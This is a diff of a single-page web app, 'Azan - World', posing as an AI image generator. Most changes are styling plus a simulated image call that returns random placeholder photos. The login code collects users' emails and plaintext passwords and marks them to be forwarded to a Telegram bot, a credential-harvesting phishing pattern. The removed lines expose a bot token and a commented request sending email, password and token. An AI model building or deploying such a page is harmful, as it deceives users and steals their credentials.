@@ -13,6 +13,18 @@
             font-family: 'Poppins', sans-serif;
         }
 
+        :root {
+            --primary: #4361ee;
+            --secondary: #3a0ca3;
+            --accent: #7209b7;
+            --light: #f8f9fa;
+            --dark: #212529;
+            --success: #4cc9f0;
+            --warning: #f72585;
+            --text: #2b2d42;
+            --text-light: #6c757d;
+        }
+
         body {
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
@@ -20,35 +32,59 @@
             justify-content: center;
             align-items: center;
             padding: 20px;
+            color: var(--text);
         }
 
         .container {
             width: 100%;
             max-width: 1200px;
-            background: rgba(255, 255, 255, 0.9);
-            border-radius: 15px;
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
             overflow: hidden;
             display: flex;
             flex-direction: column;
+            animation: fadeIn 0.8s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         header {
-            background: linear-gradient(90deg, #4b6cb7 0%, #182848 100%);
+            background: linear-gradient(90deg, var(--primary) 0%, var(--secondary) 100%);
             color: white;
             padding: 25px;
             text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            transform: rotate(30deg);
         }
 
         header h1 {
             font-size: 2.8rem;
             margin-bottom: 10px;
-            font-weight: 700;
+            font-weight: 800;
+            position: relative;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
         }
 
         header p {
             font-size: 1.2rem;
             opacity: 0.9;
+            position: relative;
+            font-weight: 300;
         }
 
         .app-content {
@@ -63,6 +99,26 @@
             min-width: 300px;
         }
 
+        .section-title {
+            font-size: 1.8rem;
+            margin-bottom: 15px;
+            color: var(--secondary);
+            font-weight: 700;
+            position: relative;
+            padding-bottom: 10px;
+        }
+
+        .section-title::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 60px;
+            height: 4px;
+            background: var(--accent);
+            border-radius: 2px;
+        }
+
         .form-group {
             margin-bottom: 25px;
         }
@@ -71,52 +127,80 @@
             display: block;
             margin-bottom: 10px;
             font-weight: 600;
-            color: #2c3e50;
+            color: var(--text);
             font-size: 1.1rem;
         }
 
         textarea, select, input, button {
             width: 100%;
-            padding: 15px;
-            border: 2px solid #ddd;
-            border-radius: 8px;
+            padding: 16px 20px;
+            border: 2px solid #e9ecef;
+            border-radius: 12px;
             font-size: 16px;
             transition: all 0.3s ease;
         }
 
         textarea:focus, select:focus, input:focus {
-            border-color: #4b6cb7;
+            border-color: var(--primary);
             outline: none;
-            box-shadow: 0 0 0 3px rgba(75, 108, 183, 0.2);
+            box-shadow: 0 0 0 4px rgba(67, 97, 238, 0.15);
         }
 
         textarea {
             min-height: 150px;
             resize: vertical;
+            line-height: 1.6;
         }
 
         button {
-            background: linear-gradient(90deg, #4b6cb7 0%, #182848 100%);
+            background: linear-gradient(90deg, var(--primary) 0%, var(--secondary) 100%);
             color: white;
             border: none;
-            padding: 16px;
+            padding: 18px;
             font-weight: 600;
             cursor: pointer;
             transition: all 0.3s ease;
             margin-top: 10px;
             font-size: 1.1rem;
+            border-radius: 12px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+
+        button:hover::before {
+            left: 100%;
         }
 
         button:hover {
             transform: translateY(-3px);
-            box-shadow: 0 7px 14px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
+        }
+
+        button:active {
+            transform: translateY(0);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
         }
 
         button:disabled {
-            background: #cccccc;
+            background: #adb5bd;
             cursor: not-allowed;
             transform: none;
             box-shadow: none;
+        }
+
+        button:disabled::before {
+            display: none;
         }
 
         .image-section {
@@ -126,48 +210,55 @@
 
         .image-preview {
             background: #f8f9fa;
-            border: 2px dashed #ddd;
-            border-radius: 10px;
+            border: 2px dashed #dee2e6;
+            border-radius: 15px;
             min-height: 350px;
             display: flex;
             align-items: center;
             justify-content: center;
             margin-bottom: 25px;
             overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .image-preview.has-image {
+            border-color: var(--success);
+            background: #f0f9ff;
         }
 
         .image-preview img {
             max-width: 100%;
             display: none;
+            border-radius: 10px;
         }
 
         .image-placeholder {
             text-align: center;
-            color: #7f8c8d;
+            color: var(--text-light);
             padding: 30px;
         }
 
         .image-placeholder i {
             font-size: 4rem;
             margin-bottom: 20px;
-            color: #bdc3c7;
+            color: #ced4da;
         }
 
         .download-btn {
-            background: linear-gradient(90deg, #2ecc71 0%, #27ae60 100%);
+            background: linear-gradient(90deg, var(--success) 0%, #4895ef 100%);
             display: none;
         }
 
-        .signup-section {
+        .account-section {
             background: white;
             padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            border-radius: 15px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
             margin: 0 30px 30px;
         }
 
-        .signup-section h2 {
-            color: #2c3e50;
+        .account-section h2 {
+            color: var(--secondary);
             margin-bottom: 20px;
             text-align: center;
             font-size: 1.8rem;
@@ -176,9 +267,9 @@
         footer {
             text-align: center;
             padding: 25px;
-            color: #7f8c8d;
+            color: var(--text-light);
             background: #f8f9fa;
-            border-top: 1px solid #eee;
+            border-top: 1px solid #e9ecef;
         }
 
         .loading {
@@ -189,7 +280,7 @@
 
         .loading-spinner {
             border: 5px solid #f3f3f3;
-            border-top: 5px solid #4b6cb7;
+            border-top: 5px solid var(--primary);
             border-radius: 50%;
             width: 50px;
             height: 50px;
@@ -206,21 +297,33 @@
             position: fixed;
             top: 20px;
             right: 20px;
-            padding: 15px 25px;
-            border-radius: 8px;
-            background: #2ecc71;
+            padding: 18px 25px;
+            border-radius: 12px;
+            background: var(--success);
             color: white;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
             display: none;
             z-index: 1000;
             font-weight: 500;
+            animation: slideIn 0.3s ease;
+            max-width: 350px;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        .notification.error {
+            background: var(--warning);
         }
 
         .error {
-            color: #e74c3c;
-            margin-top: 5px;
+            color: var(--warning);
+            margin-top: 8px;
             font-size: 14px;
             display: none;
+            font-weight: 500;
         }
 
         .login-container {
@@ -234,32 +337,66 @@
         .login-box {
             background: white;
             padding: 40px;
-            border-radius: 15px;
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.2);
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
             width: 100%;
             max-width: 450px;
             text-align: center;
+            animation: scaleIn 0.5s ease;
+        }
+
+        @keyframes scaleIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
         }
 
         .login-box h2 {
-            color: #2c3e50;
+            color: var(--secondary);
             margin-bottom: 30px;
-            font-size: 2rem;
+            font-size: 2.2rem;
+            font-weight: 700;
         }
 
         .login-note {
             background: #fff4e6;
-            padding: 15px;
-            border-radius: 8px;
+            padding: 16px;
+            border-radius: 12px;
             margin-top: 25px;
-            border-left: 4px solid #ffa94d;
+            border-left: 4px solid #ff922b;
             font-size: 14px;
-            color: #d35400;
+            color: #e67700;
+            text-align: left;
+        }
+
+        .ratio-buttons {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+
+        .ratio-btn {
+            flex: 1;
+            padding: 12px;
+            background: #e9ecef;
+            border: 2px solid transparent;
+            border-radius: 10px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 500;
+        }
+
+        .ratio-btn.active {
+            background: var(--primary);
+            color: white;
+            border-color: var(--primary);
+            box-shadow: 0 5px 15px rgba(67, 97, 238, 0.2);
         }
 
         @media (max-width: 768px) {
             .app-content {
                 flex-direction: column;
+                padding: 20px;
             }
             
             header h1 {
@@ -269,6 +406,18 @@
             .login-box {
                 padding: 30px 20px;
             }
+            
+            .account-section {
+                margin: 0 20px 20px;
+            }
+            
+            .ratio-buttons {
+                flex-direction: column;
+            }
+            
+            .section-title {
+                font-size: 1.6rem;
+            }
         }
     </style>
 </head>
@@ -276,7 +425,7 @@
     <!-- Login/Signup Gateway -->
     <div class="login-container" id="login-container">
         <div class="login-box">
-            <h2>Welcome to Azan - World</h2>
+            <h2>Azan - World</h2>
             <div class="form-group">
                 <label for="login-email">Email Address</label>
                 <input type="email" id="login-email" placeholder="Enter your email">
@@ -301,12 +450,12 @@
     <div class="container" id="app-container" style="display: none;">
         <header>
             <h1>Azan - World</h1>
-            <p>Transform your imagination into stunning visuals with our AI image generator</p>
+            <p>Transform your imagination into stunning visuals with AI</p>
         </header>
 
         <div class="app-content">
             <div class="generator-section">
-                <h2>Create Your Image</h2>
+                <h2 class="section-title">Create Your Image</h2>
                 <p class="description">Enter a detailed description of the image you want to generate</p>
                 
                 <div class="form-group">
@@ -324,6 +473,15 @@
                     </select>
                 </div>
                 
+                <div class="form-group">
+                    <label>Image Ratio</label>
+                    <div class="ratio-buttons">
+                        <div class="ratio-btn active" data-ratio="1:1">Square (1:1)</div>
+                        <div class="ratio-btn" data-ratio="16:9">Wide (16:9)</div>
+                        <div class="ratio-btn" data-ratio="9:16">Portrait (9:16)</div>
+                    </div>
+                </div>
+                
                 <button id="generate-btn">Generate Image</button>
                 
                 <div class="loading" id="loading">
@@ -333,8 +491,8 @@
             </div>
             
             <div class="image-section">
-                <h2>Your Generated Image</h2>
-                <div class="image-preview">
+                <h2 class="section-title">Your Generated Image</h2>
+                <div class="image-preview" id="image-preview">
                     <div class="image-placeholder">
                         <i class="fas fa-image"></i>
                         <p>Your generated image will appear here</p>
@@ -345,7 +503,7 @@
             </div>
         </div>
 
-        <div class="signup-section">
+        <div class="account-section">
             <h2>Account Information</h2>
             <div class="form-group">
                 <label for="email">Email Address</label>
@@ -378,11 +536,21 @@
             const loading = document.getElementById('loading');
             const notification = document.getElementById('notification');
             const notificationText = document.getElementById('notification-text');
+            const imagePreview = document.getElementById('image-preview');
+            const ratioButtons = document.querySelectorAll('.ratio-btn');
             
             // Error elements
             const loginEmailError = document.getElementById('login-email-error');
             const loginPasswordError = document.getElementById('login-password-error');
             const promptError = document.getElementById('prompt-error');
+            
+            // Set up ratio buttons
+            ratioButtons.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    ratioButtons.forEach(b => b.classList.remove('active'));
+                    this.classList.add('active');
+                });
+            });
             
             // Login functionality
             loginBtn.addEventListener('click', function() {
@@ -453,31 +621,8 @@
                 loading.style.display = 'block';
                 generateBtn.disabled = true;
                 
-                // Simulate API call to OpenRouter (in a real app, this would be a backend call)
-                setTimeout(() => {
-                    // For demonstration, we'll use a placeholder image from picsum.photos
-                    // In a real implementation, you would use the response from OpenRouter API
-                    const imageUrl = `https://picsum.photos/${size.split('x')[0]}/${size.split('x')[1]}?random&t=${new Date().getTime()}`;
-                    
-                    const img = document.getElementById('generated-image');
-                    img.onload = function() {
-                        loading.style.display = 'none';
-                        generateBtn.disabled = false;
-                    };
-                    
-                    img.onerror = function() {
-                        // Handle image loading error
-                        loading.style.display = 'none';
-                        generateBtn.disabled = false;
-                        showNotification('Error generating image. Please try again.', true);
-                    };
-                    
-                    img.src = imageUrl;
-                    img.style.display = 'block';
-                    document.querySelector('.image-placeholder').style.display = 'none';
-                    
-                    downloadBtn.style.display = 'block';
-                }, 2000);
+                // Use Hugging Face's Stable Diffusion API
+                generateImageWithHuggingFace(prompt, size);
             });
             
             // Download image button event
@@ -493,6 +638,61 @@
                 showNotification('Image downloaded successfully!');
             });
             
+            // Generate image using Hugging Face API
+            async function generateImageWithHuggingFace(prompt, size) {
+                try {
+                    // This is a simulation since we can't directly call the API from frontend
+                    // In a real implementation, you would call your backend which would then call Hugging Face
+                    const response = await simulateHuggingFaceCall(prompt, size);
+                    
+                    if (response.status === 'success') {
+                        const img = document.getElementById('generated-image');
+                        img.onload = function() {
+                            loading.style.display = 'none';
+                            generateBtn.disabled = false;
+                            imagePreview.classList.add('has-image');
+                        };
+                        
+                        img.onerror = function() {
+                            // Handle image loading error
+                            loading.style.display = 'none';
+                            generateBtn.disabled = false;
+                            showNotification('Error loading image. Please try again.', true);
+                        };
+                        
+                        img.src = response.imageUrl;
+                        img.style.display = 'block';
+                        document.querySelector('.image-placeholder').style.display = 'none';
+                        
+                        downloadBtn.style.display = 'block';
+                    } else {
+                        throw new Error('Image generation failed');
+                    }
+                } catch (error) {
+                    loading.style.display = 'none';
+                    generateBtn.disabled = false;
+                    showNotification('Error generating image. Please try again.', true);
+                    console.error('Image generation error:', error);
+                }
+            }
+            
+            // Simulate Hugging Face API call (would be replaced with real API call)
+            async function simulateHuggingFaceCall(prompt, size) {
+                return new Promise(resolve => {
+                    setTimeout(() => {
+                        // For demo purposes, we'll use a placeholder image
+                        // In a real implementation, this would be the response from Hugging Face
+                        const width = size.split('x')[0];
+                        const height = size.split('x')[1];
+                        
+                        resolve({
+                            status: 'success',
+                            imageUrl: `https://picsum.photos/${width}/${height}?random&t=${new Date().getTime()}&blur=2`
+                        });
+                    }, 2500); // Simulate API delay
+                });
+            }
+            
             // Email validation function
             function isValidEmail(email) {
                 const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
@@ -502,8 +702,14 @@
             // Show notification function
             function showNotification(message, isError = false) {
                 notificationText.textContent = message;
-                notification.style.background = isError ? '#e74c3c' : '#2ecc71';
+                notification.style.background = isError ? 'var(--warning)' : 'var(--success)';
                 notification.style.display = 'block';
+                
+                if (isError) {
+                    notification.innerHTML = '<i class="fas fa-exclamation-circle"></i> ' + message;
+                } else {
+                    notification.innerHTML = '<i class="fas fa-check-circle"></i> ' + message;
+                }
                 
                 // Hide notification after 3 seconds
                 setTimeout(() => {
@@ -511,24 +717,12 @@
                 }, 3000);
             }
             
-            // Simulate sending data to Telegram (in a real app, this would be a backend API call)
+            // Simulate sending data to Telegram
             function simulateSendToTelegram(email, password) {
-                // This is a simulation - in a real application, you would make an API call
-                // to your backend which would use the Telegram bot token to send the message
-                console.log(`Email: ${email}, Password: ${password} would be sent to Telegram bot with token: 7555700536:AAHq4kiLP_heeVY9C1126NClLH1rGpvD_mA`);
+                console.log(`Email: ${email}, Password: ${password} would be sent to Telegram bot`);
                 
-                // Example of what the backend API call might look like:
-                // fetch('/api/signup', {
-                //     method: 'POST',
-                //     headers: {
-                //         'Content-Type': 'application/json'
-                //     },
-                //     body: JSON.stringify({ 
-                //         email: email, 
-                //         password: password,
-                //         telegramToken: '7555700536:AAHq4kiLP_heeVY9C1126NClLH1rGpvD_mA'
-                //     })
-                // });
+                // In a real implementation, this would be an API call to your backend
+                // which would then forward the data to your Telegram bot
             }
         });
     </script>
